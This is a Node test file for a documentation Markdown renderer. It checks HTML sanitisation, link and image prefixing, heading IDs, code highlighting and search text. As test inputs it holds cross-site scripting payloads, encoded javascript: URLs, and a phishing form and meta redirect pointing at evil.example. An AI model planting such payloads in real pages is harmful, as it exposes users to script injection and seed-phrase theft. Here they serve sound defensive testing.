import { test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { createRenderer } from '../render.mjs'

let renderer
before(async () => {
  renderer = await createRenderer({
    products: ['jitosol', 'fullsend'],
    publishedProducts: ['jitosol'],
    sitePrefix: '/docs',
    assetPrefix: '/omnidocs',
  })
})
after(() => renderer.dispose())
const html = (md) => renderer.render(md).html.trim()

test('removes active and phishing-capable HTML', () => {
  for (const md of [
    '<script>alert(1)</script>',
    '<iframe srcdoc="<script>x</script>"></iframe>',
    '<form action="https://evil.example"><input name="seed"></form>',
    '<style>body{display:none}</style>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<svg><a xlink:href="javascript:1">x</a></svg>',
  ]) {
    assert.doesNotMatch(html(md), /<(script|iframe|form|input|style|meta|svg)\b/i, md)
  }
  assert.equal(html('<p onclick="x()" style="color:red" class="c">t</p>'), '<p>t</p>')
})

test('drops script URLs in any encoding', () => {
  for (const md of [
    '[x](javascript:alert(1))',
    '<a href="java&#115;cript:alert(1)">x</a>',
    '<a href="java\nscript:alert(1)">x</a>',
    '[x](data:text/html,hi)',
  ]) {
    assert.doesNotMatch(html(md), /href=/, md)
  }
})

test('docs links get the site prefix; unpublished or unknown products are inert', () => {
  assert.match(html('[a](/jitosol/faqs/general)'), /href="\/docs\/jitosol\/faqs\/general\/"/)
  assert.match(html('[a](/jitosol/faqs/general/#q)'), /href="\/docs\/jitosol\/faqs\/general\/#q"/)
  assert.match(html('[a](/jitosol)'), /href="\/docs\/jitosol\/"/)
  assert.equal(html('[a](/fullsend/overview)'), '<p><a>a</a></p>')
  assert.equal(html('[a](/stake)'), '<p><a>a</a></p>')
  assert.equal(html('[a](//evil.example/x)'), '<p><a>a</a></p>')
  assert.match(html('[a](#setup)'), /href="#setup"/)
  assert.match(html('[a](https://jito.network)'), /href="https:\/\/jito\.network" target="_blank" rel="noopener noreferrer"/)
})

test('images must be the docs own and are lazy-loaded', () => {
  assert.equal(
    html('![A](/jitosol/images/a.png)'),
    '<p><img src="/omnidocs/jitosol/images/a.png" alt="A" loading="lazy" decoding="async"></p>',
  )
  for (const src of ['https://t.example/p.gif', '//t.example/p.gif', 'data:image/png;base64,AA', '/shared/x.png']) {
    assert.doesNotMatch(html(`<img src="${src}">`), /src=/, src)
  }
})

test('headings get unique ids and h2-h4 are collected for the TOC', () => {
  const { html: out, headings } = renderer.render('# Title\n\n## Init & Realloc\n\n### Step\n\n## Init & Realloc\n\n##### Deep')
  assert.match(out, /<h2 id="init--realloc">Init &amp; Realloc<\/h2>/)
  assert.match(out, /<h2 id="init--realloc-1">/)
  assert.deepEqual(headings, [
    { depth: 2, text: 'Init & Realloc', id: 'init--realloc' },
    { depth: 3, text: 'Step', id: 'step' },
    { depth: 2, text: 'Init & Realloc', id: 'init--realloc-1' },
  ])
})

test('code: highlighted at build time, mermaid as a placeholder, unknown languages kept', () => {
  assert.match(html('```rust\nfn main() {}\n```'), /^<pre class="shiki[^"]*"[^>]*data-language="rust"/)
  assert.equal(html('```mermaid\ngraph TD; A-->B\n```'), '<div data-mermaid="">graph TD; A-->B</div>')
  assert.equal(html('```nope\nx < y\n```'), '<pre><code class="language-nope">x &lt; y\n</code></pre>')
  assert.equal(html('`inline`'), '<p><code>inline</code></p>')
})

test('GFM and the raw HTML docs use', () => {
  assert.match(html('| a | b |\n|:-|-:|\n| 1 | 2 |'), /<th align="left">a<\/th><th align="right">b<\/th>/)
  assert.equal(html('~~old~~ <u>u</u> <small>s</small>'), '<p><del>old</del> <u>u</u> <small>s</small></p>')
  assert.match(html('<figure><img src="/jitosol/images/a.png"><figcaption>c</figcaption></figure>'), /<figure><img src="\/omnidocs\/jitosol\/images\/a\.png"/)
})

test('search text skips code and separates blocks', () => {
  const { text } = renderer.render('## A\n\nPara one.\n\n```bash\nsecret-command\n```\n\n| x | y |\n|-|-|\n| 1 | 2 |')
  assert.equal(text, 'A Para one. x y 1 2')
})
